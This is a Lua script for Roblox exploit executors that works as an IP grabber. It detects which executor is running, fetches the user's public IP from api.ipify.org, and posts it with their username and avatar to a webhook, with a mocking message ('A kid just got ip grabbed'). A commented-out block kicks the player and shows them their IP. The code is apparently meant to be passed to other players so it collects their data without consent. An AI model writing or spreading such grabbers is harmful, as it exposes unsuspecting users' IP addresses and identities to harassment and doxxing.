--[[ simple code
local ip = tostring(game:HttpGet("https://api.ipify.org", true))
print(ip)

local plr = game.Players.LocalPlayer

plr:Kick('Hello, '..plr.Name..' Your ip is '..ip)]]

---- Send ip to webhook (Thank you !Zy)
-- koushal better watch out bro
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with trash exploit"
local ip = tostring(game:HttpGet("https://api.ipify.org", true))

local url =
   "Webhook here"
local data = {
   ["content"] = "A kid just got ip grabbed",
   ["embeds"] = {
       {
           ["title"] = "Ez w",
           ["description"] = "Their ip is "..ip.."",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
